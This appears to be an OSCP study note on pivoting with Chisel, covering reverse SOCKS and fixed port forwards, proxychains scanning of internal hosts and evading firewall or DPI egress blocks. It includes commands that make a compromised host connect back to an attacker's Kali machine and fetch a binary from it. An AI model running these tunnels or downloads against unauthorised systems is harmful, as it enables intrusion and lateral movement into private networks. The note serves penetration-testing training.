# Chisel — HTTP Tunneling / Reverse SOCKS

Use **Chisel when normal SSH/pivot traffic is blocked but outbound HTTP/WebSocket traffic is allowed**. Chisel encapsulates tunnel traffic inside HTTP and encrypts the inner connection with SSH.

## Quick decision

```text
Need to pivot
  └─ normal SSH / tunnel blocked by firewall or DPI?
       └─ HTTP outbound allowed → Chisel reverse SOCKS
```

## Reverse SOCKS — common OSCP setup

### 1. Kali — start Chisel server

```bash
chisel server --port 8080 --reverse
# or
./chisel server -p 8888 --reverse
```

`--reverse` lets the client ask the server to create reverse forwards. With `R:socks`, the SOCKS listener is created on **Kali** (default `127.0.0.1:1080`).

### 2. Pivot host — connect back to Kali

Linux:

```bash
/tmp/chisel client <KALI_IP>:8080 R:socks > /dev/null 2>&1 &
```

Windows:

```powershell
.\chisel.exe client <KALI_IP>:8080 R:socks
```

Traffic flow:

```text
Kali tool → 127.0.0.1:1080 SOCKS → Chisel server
           → HTTP/WebSocket tunnel → compromised pivot
           → internal target
```

## Use the SOCKS tunnel

### Proxychains

Make sure `/etc/proxychains4.conf` contains:

```text
socks5 127.0.0.1 1080
```

Then:

```bash
proxychains nmap -sT -Pn -n 10.10.10.50
proxychains evil-winrm -i 10.10.10.50 -u user -p pass
proxychains smbclient -L //10.10.10.50 -U user
```

> Through SOCKS, use **TCP connect scans (`-sT`)**, not SYN scans (`-sS`). Add `-Pn -n` to avoid discovery/DNS issues through the proxy.

### SSH directly through Chisel SOCKS

SSH has no generic `--socks` option. Use `ProxyCommand` with Ncat:

```bash
sudo apt install ncat
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@<INTERNAL_IP>
```

`%h` and `%p` are replaced by SSH with the destination host and port.


## Fixed reverse port forward — best for one internal web service

Chapter 24 uses a **fixed reverse port forward** instead of SOCKS when browser interaction with an internal WordPress site is more convenient through a local Kali port.

### Kali — reverse-enabled Chisel server

```bash
./chisel server -p 8080 --reverse
```

### Windows pivot — expose one internal service on Kali

Syntax:

```powershell
.\chisel.exe client <KALI_IP>:8080 R:<KALI_LOCAL_PORT>:<INTERNAL_HOST>:<INTERNAL_PORT>
```

Example:

```powershell
.\chisel.exe client <KALI_IP>:8080 R:8081:172.16.6.241:80
```

Traffic flow:

```text
browser on Kali → 127.0.0.1:8081
                → Chisel server
                → reverse tunnel to compromised pivot
                → 172.16.6.241:80
```

Browse:

```text
http://127.0.0.1:8081
```

### Internal FQDN redirect gotcha

Internal web applications may redirect from the forwarded localhost URL to their configured FQDN, for example:

```text
internalsrv1.corp.local
```

If Kali cannot resolve/reach that name directly, map it back to the local forwarded listener:

```bash
sudo sh -c 'echo "127.0.0.1 internalsrv1.corp.local" >> /etc/hosts'
```

Then browse using the FQDN while the TCP connection still lands on the Chisel listener.

> [!note]
> If your reverse listener is on a non-default local port, include that port in the browser URL as needed. The key idea is **FQDN → localhost**, not bypassing the tunnel.

### SOCKS vs fixed forward

```text
many hosts / many ports / CLI tools → R:socks + proxychains
one internal web app / browser use   → fixed R:local:host:port
```

Related: [[Methodology/Assembling the Pieces — End-to-End OSCP Attack Chain|Assembling the Pieces]]

## Transfer Chisel to a Linux pivot

If the target can reach Kali over HTTP:

```bash
# Kali
sudo cp "$(which chisel)" /var/www/html/
sudo systemctl start apache2

# Pivot
wget http://<KALI_IP>/chisel -O /tmp/chisel
chmod +x /tmp/chisel
```

Use the correct Chisel binary for the target **OS and architecture**.

## Verify

On Kali:

```bash
ss -ntplu | grep -E '1080|8080|8888'
```

Expected for `R:socks`:

```text
127.0.0.1:1080   LISTEN   chisel
```

Optional traffic check:

```bash
sudo tcpdump -nvvvXi tun0 tcp port 8080
```

Chisel normally establishes an HTTP/WebSocket connection, which is why it can work when raw SSH traffic is rejected by DPI.

## Troubleshooting

- **No client connection:** confirm pivot → Kali connectivity on the Chisel server port.
- **SOCKS port missing:** server must use `--reverse`; client must request `R:socks`.
- **Proxychains hangs:** test one known internal IP/port first; verify the pivot itself can reach it.
- **Nmap fails:** use `-sT -Pn -n`, not SYN/UDP scanning through SOCKS.
- **Binary fails to execute:** verify architecture/OS and permissions.
- **HTTP itself is blocked:** Chisel will not solve it; consider another allowed egress channel such as DNS.

See also:
- [[Intro]]
- [[SSH Tunneling]]
- [[DNS Tunneling - dnscat2]]
